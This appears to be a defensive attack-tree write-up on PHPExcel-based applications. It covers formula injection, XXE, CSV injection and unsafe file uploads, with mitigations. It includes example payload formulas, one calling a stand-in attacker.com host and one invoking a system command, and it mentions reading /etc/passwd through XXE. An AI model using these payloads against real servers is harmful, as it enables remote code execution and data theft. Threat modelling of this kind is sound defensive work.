## Attack Tree Path: [Formula Injection [HIGH RISK] [CRITICAL]](./attack_tree_paths/formula_injection__high_risk___critical_.md)

    *   **Description:** Attackers inject malicious code into spreadsheet cells using formulas. If PHPExcel is configured to evaluate formulas, this code can be executed on the server.
    *   **Attack Vectors:**
        *   **Direct PHP Code Execution:** Injecting PHP code directly into formulas, often leveraging functions that allow interaction with the system or external resources. Examples (conceptual, as specific functions may be disabled or behave differently):
            *   `=WEBSERVICE("http://attacker.com/evil.php")` (If `WEBSERVICE` is enabled)
            *   `=CALL("system","whoami")` (If `CALL` is enabled and allows system command execution)
            *   Chaining multiple formulas to achieve a desired outcome, even if individual functions seem harmless.
        *   **Exploiting Enabled Functions:** Abusing seemingly benign functions that, in specific contexts or combinations, can lead to code execution. This often involves finding ways to interact with the filesystem or external resources.
        *   **Obfuscation:** Attackers can use various techniques to obfuscate their malicious formulas, making them harder to detect.
    *   **Impact:** Remote Code Execution (RCE) [CRITICAL], leading to complete server compromise.
    *   **Mitigation:**
        *   **Disable Formula Evaluation:** The most effective mitigation. Use `$reader->setReadDataOnly(true);` in PhpSpreadsheet.
        *   **Function Blacklisting/Whitelisting:** If formula evaluation is *required*, strictly control which functions are allowed.
        *   **Input Validation (Indirect):** Validate the *context* in which the spreadsheet is used, checking for expected data types and structures.

## Attack Tree Path: [XML Parsing [HIGH RISK]](./attack_tree_paths/xml_parsing__high_risk_.md)

    *   **Description:** Vulnerabilities in how PHPExcel parses XML-based spreadsheet formats (like XLSX). The primary concern is XML External Entity (XXE) attacks.
    *   **Attack Vectors:**
        *   **XXE (if XML) [CRITICAL]:**
            *   **Description:** Attackers craft malicious XLSX files containing XML External Entities. If the XML parser is misconfigured (external entities are enabled), these entities can be used to:
                *   **Read Local Files:** Access sensitive files on the server (e.g., `/etc/passwd`, configuration files).
                *   **Server-Side Request Forgery (SSRF):** Force the server to make requests to internal or external systems, potentially accessing internal services or causing denial of service.
                *   **Denial of Service (DoS):** Create deeply nested entities or reference large external resources, consuming server resources.
            *   **Exploitation Methods:**
                *   **Direct Entity References:** Defining entities that directly reference local files or URLs.
                *   **Parameter Entities:** Using parameter entities within DTDs for more complex attacks.
                *   **Out-of-Band (OOB) XXE:** Exfiltrating data through external channels (e.g., DNS requests) if direct output is not available.
            *   **Impact:** Information Disclosure, SSRF, DoS, and potentially RCE (through SSRF).
            *   **Mitigation:**
                *   **Disable External Entities:** `libxml_disable_entity_loader(true);` *before* loading any XML-based spreadsheet. This is the primary defense.
                *   **Disable DTD Processing:** If DTDs are not needed, disable them.
                *   **WAF:** A Web Application Firewall can help detect and block some XXE attempts.

## Attack Tree Path: [CSV Parsing [HIGH RISK]](./attack_tree_paths/csv_parsing__high_risk_.md)

    *   **Description:** While CSV parsing itself within PHPExcel might not lead to direct RCE, the *way the extracted data is used* presents a significant risk, primarily through CSV injection leading to other vulnerabilities.
    *   **Attack Vectors:**
        *   **Data Exfiltration (leading to XSS):** If the CSV data is later displayed in a web page *without proper sanitization and output encoding*, attackers can inject malicious HTML or JavaScript code. This is technically a Cross-Site Scripting (XSS) vulnerability, but it originates from the CSV data.
        *   **DoS:** Malformed or excessively large CSV files can cause resource exhaustion.
    *   **Impact:** Primarily XSS (through data exfiltration) and DoS.
    *   **Mitigation:**
        *   **Output Encoding:** *Always* encode data extracted from CSV files before displaying it in a web page. Use appropriate encoding functions for the context (e.g., HTML encoding, JavaScript encoding).
        *   **Input Validation (Indirect):** Validate the *structure* of the CSV data if possible, checking for expected data types and lengths.
        *   **Content Security Policy (CSP):** A strong CSP can help mitigate the impact of XSS attacks.

## Attack Tree Path: [Read/Write Arbitrary Files (if misconfigured) [CRITICAL]](./attack_tree_paths/readwrite_arbitrary_files__if_misconfigured___critical_.md)

    * **Description:** If the application is misconfigured, allowing direct access to uploaded files, an attacker can bypass PHPExcel entirely.
    * **Attack Vectors:**
        * **Direct PHP File Upload:** Uploading a `.php` file containing malicious code directly to a web-accessible directory.
        * **Other Malicious File Types:** Uploading other file types that can be executed or interpreted by the server (e.g., `.htaccess` files to modify server configuration).
    * **Impact:** Remote Code Execution (RCE), complete server compromise.
    * **Mitigation:**
        * **Store Uploaded Files Outside the Webroot:** This is the most crucial step.
        * **Use Random Filenames:** Generate unique, random filenames for uploaded files to prevent overwriting existing files and to make it harder for attackers to guess filenames.
        * **Access Files Through a Script:**  Use a script that performs authentication, authorization, and validation before serving the file content.  This script acts as a gatekeeper.
        * **Restrict File Extensions:**  Use a whitelist approach to allow only specific, safe file extensions.
        * **Web Server Configuration:** Configure the web server (e.g., Apache, Nginx) to prevent direct access to the upload directory.
